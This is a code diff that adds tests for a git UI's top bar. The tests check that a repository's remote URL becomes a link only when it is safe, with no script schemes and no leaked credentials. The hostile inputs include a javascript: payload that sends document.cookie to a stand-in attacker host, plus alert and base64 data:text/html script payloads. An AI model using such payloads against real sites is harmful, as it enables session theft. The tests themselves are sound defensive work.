@@ -559,3 +559,109 @@ test("a record with many references shows the first twelve and says how many mor
     await vite.close();
   }
 });
+
+// ---------------------------------------------------------------------------
+// The repository path in the top bar links to its remote when one is safe to
+// link. What makes it safe is the substance: the href is the only place a
+// string from git config becomes something the browser will navigate.
+// ---------------------------------------------------------------------------
+
+const REPO_PATH = "/Users/someone/play/gitseq";
+
+async function topBarMarkup(vite, repoRemote) {
+  const { TopBar } = await vite.ssrLoadModule("/src/components/TopBar.tsx");
+  const room = { ...workroom({}), repo: REPO_PATH, repoRemote };
+  return renderToStaticMarkup(
+    React.createElement(TopBar, { workroom: room, session: {}, onJumpEvent() {}, onPublish() {} }),
+  );
+}
+
+test("an https remote turns the repository path into a link that cannot reach its opener", async () => {
+  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
+  try {
+    const markup = await topBarMarkup(vite, "https://github.com/generalbusiness-ai/gitseq.git");
+    const anchor = markup.match(/<a\b[^>]*>/);
+    assert.ok(anchor, "the repository path did not render as a link");
+    assert.match(anchor[0], /href="https:\/\/github\.com\/generalbusiness-ai\/gitseq\.git"/);
+    assert.match(anchor[0], /rel="noopener noreferrer"/, "a new-tab link must not hand the opener over");
+    assert.match(anchor[0], /target="_blank"/);
+    assert.ok(markup.includes(REPO_PATH), "the link still reads as the served path");
+  } finally {
+    await vite.close();
+  }
+});
+
+// The fallback is not "something reasonable"; it is byte-for-byte the markup a
+// repository with no remote produces, so an unlinkable remote can never be
+// told apart from no remote at all.
+test("an unlinkable remote renders exactly as no remote does", async () => {
+  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
+  try {
+    const none = await topBarMarkup(vite, undefined);
+    assert.doesNotMatch(none, /<a\b/, "a repository with no remote must render no link");
+    for (const unlinkable of [
+      "git@github.com:generalbusiness-ai/gitseq.git",
+      "ssh://git@github.com/generalbusiness-ai/gitseq.git",
+      // git:// parses cleanly and carries no userinfo, so only the scheme
+      // allowlist can refuse it.
+      "git://github.com/generalbusiness-ai/gitseq.git",
+      "file:///srv/git/gitseq.git",
+      // A scheme nobody has enumerated, carrying an authority so that a
+      // missing host is not what refuses it. An allowlist refuses this
+      // because it is unlisted; a denylist of known-bad schemes admits it.
+      "future+git://github.com/generalbusiness-ai/gitseq.git",
+      "not a url at all",
+    ]) {
+      assert.equal(await topBarMarkup(vite, unlinkable), none, `${unlinkable} did not fall back to plain text`);
+    }
+  } finally {
+    await vite.close();
+  }
+});
+
+test("a script-bearing remote never reaches an href", async () => {
+  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
+  try {
+    for (const hostile of [
+      "javascript:fetch('https://attacker.invalid?c='+document.cookie)",
+      "JavaScript:alert(document.domain)",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    ]) {
+      const markup = await topBarMarkup(vite, hostile);
+      assert.doesNotMatch(markup, /href=/, `${hostile} reached an href attribute`);
+      assert.doesNotMatch(markup, /javascript:|data:|attacker\.invalid/i, `${hostile} reached the DOM`);
+    }
+  } finally {
+    await vite.close();
+  }
+});
+
+test("a remote carrying userinfo does not leak it into the DOM", async () => {
+  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
+  try {
+    const markup = await topBarMarkup(vite, "https://x-access-token:s3cr3t-token@github.com/generalbusiness-ai/gitseq.git");
+    assert.doesNotMatch(markup, /s3cr3t-token|x-access-token/, "a credential in the remote URL reached the DOM");
+    assert.doesNotMatch(markup, /<a\b/, "a remote carrying userinfo is declined, not stripped and linked");
+  } finally {
+    await vite.close();
+  }
+});
+
+// The same rule as userinfo, applied to the other two places a URL can carry a
+// credential. Declining userinfo while passing a query through would be one
+// rule applied to one syntax.
+test("a remote carrying a query or fragment does not leak it into the DOM", async () => {
+  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
+  try {
+    for (const bearing of [
+      "https://github.com/generalbusiness-ai/gitseq.git?access_token=s3cr3t-token",
+      "https://github.com/generalbusiness-ai/gitseq.git#access_token=s3cr3t-token",
+    ]) {
+      const markup = await topBarMarkup(vite, bearing);
+      assert.doesNotMatch(markup, /s3cr3t-token|access_token/, `${bearing} reached the DOM`);
+      assert.doesNotMatch(markup, /<a\b/, `${bearing} was linked rather than declined`);
+    }
+  } finally {
+    await vite.close();
+  }
+});
